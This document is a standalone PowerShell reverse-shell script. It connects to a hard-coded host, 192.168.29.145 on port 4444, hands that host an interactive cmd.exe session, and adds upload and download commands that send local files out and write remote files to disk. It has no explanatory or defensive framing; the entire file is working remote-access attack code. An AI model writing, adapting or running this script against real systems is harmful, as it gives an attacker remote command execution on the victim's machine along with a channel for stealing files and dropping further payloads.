function cleanup {
    if ($client.Connected -eq $true) {
        $client.Close()
    }
    if ($process.ExitCode -ne $null) {
        $process.Close()
    }
    exit
}

$address = '192.168.29.145'
$port = '4444'
$client = New-Object system.net.sockets.tcpclient

try {
    $client.connect($address,$port)
} catch {
    cleanup
}

$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()

$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;

while (-not $done) {
    if ($client.Connected -ne $true) {
        cleanup
    }

    $pos = 0; $i = 1

    while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
        $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
        $pos+=$read
        if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}
    }

    if ($pos -gt 0) {
        $string = $encoding.GetString($networkbuffer,0,$pos)
        if ($string -match '^upload (.+)') {
            $filename = $matches[1]
            $data = [System.IO.File]::ReadAllBytes($filename)
            $stream.Write($data, 0, $data.Length)
        } elseif ($string -match '^download (.+)') {
            $filename = $matches[1]
            $data = New-Object byte[] 4096
            $fs = New-Object System.IO.FileStream($filename, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
            do {
                $read = $stream.Read($data, 0, $data.Length)
                $fs.Write($data, 0, $read)
            } while ($read -gt 0)
            $fs.Close()
        } else {
            $inputstream.write($string)
            start-sleep 1
            if ($process.ExitCode -ne $null) {
                cleanup
            }
            else {
                $out = $encoding.GetString($outputstream.Read())
                while($outputstream.Peek() -ne -1){
                    $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
                $stream.Write($encoding.GetBytes($out),0,$out.length)
                $out = $null
                $string = $null
            }
        }
    } else {
        cleanup
    }
}